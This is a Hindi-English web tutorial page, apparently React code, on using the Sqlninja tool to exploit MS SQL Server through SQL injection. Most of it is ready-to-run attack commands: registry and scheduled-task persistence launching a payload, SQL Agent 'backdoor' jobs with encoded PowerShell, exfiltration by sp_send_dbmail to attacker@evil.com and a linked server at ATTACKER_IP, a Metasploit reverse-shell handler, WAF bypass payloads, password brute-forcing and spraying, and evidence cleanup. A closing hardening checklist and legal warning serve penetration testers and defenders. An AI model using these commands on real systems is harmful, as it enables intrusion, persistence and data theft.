sqlninja -m cmd -c "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /d C:\temp\payload.exe" -f config.xml

# Scheduled task persistence:
sqlninja -m cmd -c "schtasks /create /tn Update /tr C:\temp\payload.exe /sc onlogon" -f config.xml

# Data exfiltration via BCP:
sqlninja -m cmd -c "bcp \"SELECT * FROM database.dbo.users\" queryout C:\temp\data.csv -c -t, -S localhost -U sa -P password" -f config.xml

# SQL Server Agent job abuse:
sqlninja -m cmd -c "USE msdb; EXEC sp_add_job @job_name='backdoor'" -f config.xml
sqlninja -m cmd -c "EXEC sp_add_jobstep @job_name='backdoor', @step_name='s1', @subsystem='CmdExec', @command='powershell -enc BASE64_PAYLOAD'" -f config.xml
sqlninja -m cmd -c "EXEC sp_add_jobserver @job_name='backdoor'" -f config.xml
sqlninja -m cmd -c "EXEC sp_start_job @job_name='backdoor'" -f config.xml

# Linked server creation (क्रॉस-server attack):
sqlninja -m cmd -c "EXEC sp_addlinkedserver @server='EVIL', @srvproduct='', @provider='SQLNCLI', @datasrc='ATTACKER_IP'" -f config.xml

# OPENROWSET से remote query:
sqlninja -m cmd -c "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=ATTACKER_IP;Trusted_Connection=yes;', 'SELECT 1')" -f config.xml`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Sqlninja और Sqlmap में क्या फ़र्क है?', a: 'Sqlninja सिर्फ MS SQL Server के लिए है — xp_cmdshell handling बेहतर है, meterpreter integration built-in है। Sqlmap generic है सभी databases के लिए। MS SQL target पर दोनों try करो — Sqlninja xp_cmdshell में better है, Sqlmap auto-detection में better है।' },
          { q: 'क्या Sqlninja blind SQL injection support करता है?', a: 'हाँ, time-based blind injection support करता है। Config में timeout set करो। Boolean-based blind भी support है। Blind injection slow है लेकिन error messages न आने पर भी काम करता है।' },
          { q: 'xp_cmdshell disabled है तो क्या करें?', a: 'SA password brute force करो (sqlninja -m brute)। SA access मिलने पर xp_cmdshell enable कर सकते हो। या trustworthy database exploit करो। या SQL Server Agent job abuse करो।' },
          { q: 'क्या SQL Server 2019/2022 पर काम करता है?', a: 'हाँ, SQL Server 2005 से 2022 तक सभी versions support करता है। xp_cmdshell सभी versions में available है (अगर enable हो)।' },
          { q: 'Meterpreter payload कैसे inject करें?', a: 'sqlninja -m shellcode -p meterpreter -f config.xml। Attacker पर msfconsole में multi/handler setup करो: use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp, set LHOST, set LPORT, exploit -j।' },
          { q: 'Linux पर चलता है?', a: 'हाँ, Sqlninja Perl में लिखा गया है और Linux/macOS पर चलता है। Kali Linux में pre-installed नहीं है लेकिन apt install sqlninja से install हो जाता है।' },
          { q: 'क्या WAF bypass कर सकता है?', a: 'Basic WAF bypass techniques हैं — SQL comments, encoding, case manipulation। लेकिन advanced WAF (ModSecurity, Cloudflare) के लिए manual bypass चाहिए। Sqlmap के tamper scripts ज़्यादा effective हैं WAF bypass के लिए।' },
          { q: 'Production environment में use कर सकते हैं?', a: 'केवल written authorization के साथ। Production में use करने से पहले test environment में verify करो। Risk of service disruption है — xp_cmdshell execution server load बढ़ा सकता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>SQL Server Specific Attacks</h2>
      <p>
        MS SQL Server की unique features जो Sqlninja exploit करता है — ये attacks दूसरे databases पर possible नहीं हैं:
      </p>
      <CodeBlock
        title="MSSQL Specific Exploits"
        code={`# 1. OPENROWSET से remote data access:
sqlninja -m cmd -c "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=REMOTE;Trusted_Connection=yes;', 'SELECT name FROM sys.databases')" -f config.xml

# 2. OLE Automation से file operations:
sqlninja -m cmd -c "DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUT; EXEC sp_OAMethod @o, 'CopyFile', NULL, 'C:\secret.txt', 'C:\temp\backup.txt'" -f config.xml

# 3. sp_send_dbmail से data exfiltration:
sqlninja -m cmd -c "EXEC msdb.dbo.sp_send_dbmail @profile_name='default', @recipients='attacker@evil.com', @subject='Data', @query='SELECT * FROM master.dbo.syslogins'" -f config.xml

# 4. SQL Server Assembly injection:
sqlninja -m cmd -c "CREATE ASSEMBLY [cmd] FROM 0x4D5A... WITH PERMISSION_SET=UNSAFE" -f config.xml

# 5. sp_OACreate से arbitrary command execution:
sqlninja -m cmd -c "DECLARE @s INT; EXEC sp_OACreate 'WScript.Shell', @s OUT; EXEC sp_OAMethod @s, 'Run', NULL, 'cmd /c whoami > C:\temp\out.txt'" -f config.xml

# 6. Linked server double hop:
sqlninja -m cmd -c "EXEC ('EXEC (''xp_cmdshell ''''whoami'''')') AT [SERVER2]" -f config.xml

# 7. SQL Server Agent proxy abuse:
sqlninja -m cmd -c "USE msdb; EXEC sp_add_proxy @proxy_name='proxy1', @credential_name='cred1'" -f config.xml`}
      />

      <h2>WAF Bypass Techniques</h2>
      <p>
        जब WAF (Web Application Firewall) SQL injection block करता है, तो ये techniques try करो:
      </p>
      <CodeBlock
        title="WAF Bypass Methods"
        code={`# 1. Comments से spaces replace करो:
# Original: SELECT * FROM users
# Bypass:   SELECT/**/*/**/FROM/**/users

# 2. Case mixing:
# Original: SELECT * FROM users
# Bypass:   SeLeCt * FrOm users

# 3. URL encoding:
# Original: ' OR 1=1--
# Bypass:   %27%20OR%201%3D1--

# 4. Double encoding:
# Bypass:   %2527%2520OR%25201%253D1--

# 5. Unicode normalization:
# Bypass:   ' OR 1=1--  (with unicode chars)

# 6. HPP (HTTP Parameter Pollution):
# id=1&id=1' OR 1=1--

# 7. Chunked transfer encoding:
# Transfer-Encoding: chunked

# 8. JSON-based injection:
# {"id": "1' OR 1=1--"}

# Sqlninja basic WAF bypass support करता है
# Advanced WAF के लिए manual bypass चाहिए`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Sqlninja real-world penetration testing में MS SQL Server environments को target करने के लिए use होता है। यहाँ practical scenarios हैं:
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Corporate Network Exploitation:</strong> एक financial company के internal pentest में tester ने web application पर SQL injection find की। Sqlninja fingerprint mode से SQL Server 2019 identify किया — xp_cmdshell disabled था। SA password bruteforce करके "Summer2023!" password मिला। xp_cmdshell enable करके PowerShell reverse shell लिया। Domain admin credentials extract किए — पूरा network compromise हो गया। Report में critical findings थे — company ने immediately remediate किया।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — E-commerce Platform Attack:</strong> Bug bounty program में researcher ने e-commerce site के login form पर blind SQL injection discover की। Sqlninja time-based injection use करके database schema extract किया। Credit card data encrypted column में मिला — encryption key server config file में hard-coded थी। Responsible disclosure करके $15,000 bounty मिली। Company ने parameterized queries implement की और xp_cmdshell permanently disable किया।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — Healthcare System Assessment:</strong> Hospital network assessment में legacy SQL Server 2008 मिला — unsupported version, no patches। Sqlninja से linked servers discover हुए जो 3 और SQL Servers से connected थे। Cross-server attack से सभी databases access हुए — patient records, billing data, insurance information सब exposed था। यह assessment compliance audit का part था — HIPAA violations critical थे।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Sqlninja दूसरे tools के साथ combine करके complete attack chain बना सकते हो:
      </p>
      <CodeBlock
        title="Sqlninja + Metasploit + Nmap Workflow"
        code={`# Step 1: Nmap से MSSQL servers find करो:
nmap -sV -p 1433 192.168.1.0/24 -oX mssql_servers.xml

# Step 2: OpenVAS/Nessus से vulnerability scan:
# SQL injection points identify करो

# Step 3: Sqlninja fingerprint:
sqlninja -m fingerprint -f config.xml

# Step 4: Sqlninja + Metasploit combo:
# Terminal 1: Metasploit handler start करो
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j

# Terminal 2: Sqlninja से meterpreter payload:
sqlninja -m shellcode -p meterpreter -f config.xml

# Step 5: Post-exploitation with Metasploit:
# Meterpreter session में:
# hashdump — password hashes
# migrate — process migration
# screenshot — screen capture
# keyscan_start — keylogger

# Step 6: CrackMapExec से lateral movement:
crackmapexec mssql 192.168.1.0/24 -u sa -p cracked_password

# Step 7: Impacket mssqlclient:
impacket-mssqlclient sa:password@target_ip -windows-auth`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Sqlninja को efficiently use करने के लिए optimization tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Thread Count:</strong> Bruteforce के लिए -t flag से threads बढ़ाओ (default 1 है)। 5-10 threads safe हैं — ज़्यादा threads server overload कर सकते हैं।</li>
        <li><strong className="text-white">Timeout Optimization:</strong> Config में timeout कम करो fast networks पर। Blind injection का timeout बढ़ाओ — slow responses handle होंगे।</li>
        <li><strong className="text-white">Wordlist Selection:</strong> Common passwords first try करो (top 1000) — 80% cases में जल्दी मिल जाता है। फिर larger wordlist use करो।</li>
        <li><strong className="text-white">Injection Efficiency:</strong> UNION-based injection fastest है — जहाँ possible वहाँ यही use करो। Time-based blind slowest है — last resort के लिए रखो।</li>
        <li><strong className="text-white">Connection Reuse:</strong> Keep-alive connections (-k flag) से overhead कम होता है। Multiple queries same connection पर भेजो।</li>
        <li><strong className="text-white">Config Optimization:</strong> Unnecessary features disable करो — verbose output only debugging के लिए। Quiet mode production use करो।</li>
        <li><strong className="text-white">Parallel Scanning:</strong> Multiple targets के लिए parallel processes use करो — xargs -P या GNU parallel। लेकिन network bandwidth monitor करो।</li>
        <li><strong className="text-white">Database-Specific Tuning:</strong> SQL Server version-specific optimizations — older versions (2005/2008) में different injection techniques better काम करती हैं।</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Sqlninja results को properly document करना penetration testing report के लिए ज़रूरी है:
      </p>
      <CodeBlock
        title="Results Collection and Reporting"
        code={`# All output capture करो:
sqlninja -m fingerprint -f config.xml 2>&1 | tee fingerprint_report.txt
sqlninja -m getinfo -f config.xml 2>&1 | tee getinfo_report.txt
sqlninja -m enumerate -f config.xml 2>&1 | tee enumerate_report.txt

# Vulnerability evidence collect करो:
# 1. SQL injection proof:
echo "=== SQL Injection Proof ===" >> evidence.txt
echo "URL: http://target.com/page.asp?id=1" >> evidence.txt
echo "Payload: ' OR 1=1--" >> evidence.txt
echo "Result: Authentication bypass" >> evidence.txt

# 2. xp_cmdshell proof:
echo "=== Command Execution Proof ===" >> evidence.txt
sqlninja -m cmd -c "whoami" -f config.xml >> evidence.txt

# 3. Screenshot evidence:
# Browser में injection result capture करो

# Risk rating matrix:
# Critical: xp_cmdshell enabled + SA access
# High: SQL injection + data extraction
# Medium: Information disclosure
# Low: Version disclosure

# Report template:
# 1. Executive Summary
# 2. Scope and Methodology
# 3. Findings (Critical/High/Medium/Low)
# 4. Evidence (screenshots, command outputs)
# 5. Remediation Recommendations
# 6. Appendix (raw tool output)`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sqlmap</td><td className="py-2 px-3">SQL injection automation</td><td className="py-2 px-3">Generic — सभी databases support, 100+ tamper scripts</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PowerUpSQL</td><td className="py-2 px-3">MSSQL exploitation (PowerShell)</td><td className="py-2 px-3">Windows AD environment में best, PowerShell native</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SQLPowerInjector</td><td className="py-2 px-3">SQL injection GUI tool</td><td className="py-2 px-3">Visual interface, multi-db, .NET based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">jSQL Injection</td><td className="py-2 px-3">Java-based SQL injection</td><td className="py-2 px-3">Cross-platform, GUI, Java based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Metasploit MSSQL modules</td><td className="py-2 px-3">MSSQL auxiliary/exploit modules</td><td className="py-2 px-3">Framework integration, multiple modules</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CrackMapExec MSSQL</td><td className="py-2 px-3">MSSQL protocol exploitation</td><td className="py-2 px-3">AD environment, credential spraying</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Impacket mssqlclient</td><td className="py-2 px-3">MSSQL client</td><td className="py-2 px-3">TDS protocol, Windows auth support</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">NoSQLMap</td><td className="py-2 px-3">NoSQL injection</td><td className="py-2 px-3">MongoDB, CouchDB exploitation</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tip 1:</strong> MS SQL Server target पर पहले Sqlmap try करो — auto-detection अच्छी है। अगर xp_cmdshell exploitation में problem आए तो Sqlninja switch करो — इसका xp_cmdshell handling ज़्यादा reliable है। दोनों tools complement करते हैं।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 2:</strong> SA password bruteforce से पहले default passwords try करो — sa/sa, sa/password, sa/admin, sa/123456। बहुत सारे SQL Servers default passwords पर चलते हैं। RockYou.txt बड़ा wordlist है लेकिन common passwords पहले try करो — time बचेगा।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 3:</strong> Linked servers बहुत powerful हैं — एक compromised SQL Server से दूसरे SQL Server तक पहुंच सकते हो। sp_linkedservers से linked servers enumerate करो और cross-server attacks try करो। यह lateral movement का बहुत अच्छा तरीका है।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 4:</strong> Trustworthy databases exploit करो privilege escalation के लिए — SELECT name FROM sys.databases WHERE is_trustworthy_on=1। Trustworthy database में db_owner role वाला user sysadmin बन सकता है। यह technique कम जानी जाती है लेकिन बहुत effective है।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 5:</strong> SQL Server Agent jobs persistence के लिए best हैं — scheduled task create करो जो定期 reverse shell callback करे। Detection difficult है क्योंकि jobs SQL Server internal feature हैं। Cleanup के लिए: EXEC sp_delete_job @job_name='backdoor'।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 6:</strong> xp_cmdshell output capture करने के लिए temporary table use करो: CREATE TABLE #output (line VARCHAR(8000)); INSERT INTO #output EXEC xp_cmdshell 'whoami'; SELECT * FROM #output। यह blind injection scenarios में useful है जहाँ direct output नहीं दिखता।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 7:</strong> SQL Server 2017+ में xp_cmdshell default disabled है और enable करने के लिए sysadmin role चाहिए। Alternative: OLE Automation (sp_OACreate) use करो — यह different permissions में काम कर सकता है। EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; फिर sp_OACreate से WScript.Shell object बनाओ।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 8:</strong> Blind SQL injection में data exfiltration slow होती है — binary search technique use करो speed बढ़ाने के लिए। Character by character extract करने के बाइनरी search: AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)) > 128 — half split करके faster extraction।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 9:</strong> SQL Server का error log useful information देता है — EXEC xp_readerrorlog। Previous login attempts, failed queries, और system events दिखते हैं। Reconnaissance phase में यह data बहुत valuable है। SQL Server Configuration Manager से log location पता करो।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 10:</strong> Multiple SQL Servers compromise करने के लिए credential reuse try करो — एक server से मिला SA password दूसरे servers पर भी काम कर सकता है। CrackMapExec mssql module spray के लिए perfect है: crackmapexec mssql 192.168.1.0/24 -u sa -p password123।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 11:</strong> SQL Server configuration registry में store होती है — HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQLServer। Registry access मिलने पर config changes, data paths, और credentials extract कर सकते हो। xp_regread stored procedure use करो।
      </div>
      <div className="info-box mt-6">
        <strong>💡 Pro Tip 12:</strong> SQL Server memory में sensitive data cache होता है — plan cache, buffer cache, और procedure cache। DBCC FREEPROCCACHE से cache clear करो evidence cleanup के लिए। Forensic investigation में memory dump analyze करो — credentials और queries memory में मिल सकते हैं।
      </div>

      <h2>Defense and Hardening Checklist</h2>
      <p>
        MS SQL Server को Sqlninja जैसे tools से बचाने के लिए comprehensive hardening checklist:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">xp_cmdshell Disable:</strong> EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; — command execution completely block हो जाएगी।</li>
        <li><strong className="text-white">SA Account Rename:</strong> ALTER LOGIN sa WITH NAME=sysadmin_sa; — default SA account rename करो bruteforce रोकने के लिए।</li>
        <li><strong className="text-white">Strong SA Password:</strong> 16+ characters, complexity requirements, regular rotation। Common passwords (Summer2023!, Password123) कभी मत use करो।</li>
        <li><strong className="text-white">Network Isolation:</strong> SQL Server को internal network पर रखो, internet-facing मत बनाओ। Firewall rules से port 1433 restrict करो।</li>
        <li><strong className="text-white">Least Privilege:</strong> Application को db_datareader/writer दो, db_owner या sysadmin मत दो। Separate accounts बनाओ different functions के लिए।</li>
        <li><strong className="text-white">Audit Logging:</strong> SQL Server Audit feature enable करो — login attempts, query execution, permission changes सब log होगा।</li>
        <li><strong className="text-white">Input Validation:</strong> Parameterized queries mandatory करो code level पर। ORM frameworks (Entity Framework, Hibernate) safe defaults provide करते हैं।</li>
        <li><strong className="text-white">Regular Patching:</strong> SQL Server CU (Cumulative Updates) और security patches promptly install करो। Unsupported versions (2005, 2008) immediately upgrade करो।</li>
        <li><strong className="text-white">TDE Enable:</strong> Transparent Data Encryption enable करो — database files encrypted store होंगे। Physical access से data protection मिलेगी।</li>
        <li><strong className="text-white">Linked Server Review:</strong> sp_linkedservers से linked servers check करो — unnecessary links remove करो। Cross-server access minimize करो।</li>
        <li><strong className="text-white">Surface Area Reduction:</strong> Unused features disable करो — CLR integration, OLE Automation, xp_cmdshell, Database Mail XPs। सिर्फ required features enable रखो।</li>
        <li><strong className="text-white">Connection Encryption:</strong> Force encryption enable करो SQL Server Configuration Manager में। SSL certificates configure करो — man-in-the-middle attacks prevent होंगी।</li>
        <li><strong className="text-white">Monitoring and Alerting:</strong> SQL Server Extended Events setup करो — suspicious queries, failed logins, और permission changes पर alerts trigger होंगे। SIEM integration centralized monitoring provide करता है।</li>
      </ul>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Sqlninja एक powerful MS SQL exploitation टूल है। इसका इस्तेमाल केवल अधिकृत penetration testing में ही करें। बिना अनुमति के SQL injection exploitation करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत database access अपराध हो सकता है। Production environment में testing से पहले written authorization लें। SQL injection सबसे common और dangerous vulnerability है — OWASP Top 10 में #1 पर है। Parameterized queries सबसे effective defense है — कभी भी string concatenation से queries न बनाएं। WAF, input validation, और least privilege principle layered defense provide करते हैं। xp_cmdshell, OLE Automation, और linked servers जैसे features disable रखो जब तक ज़रूरी न हो। SQL Server audit logs enable करो suspicious queries detect करने के लिए। Regular security patches install करो — Microsoft monthly security updates release करता है। Database backup strategy maintain करो — ransomware attack में backup ही last resort होता है।
      </div>
    </TutorialLayout>
  )
}
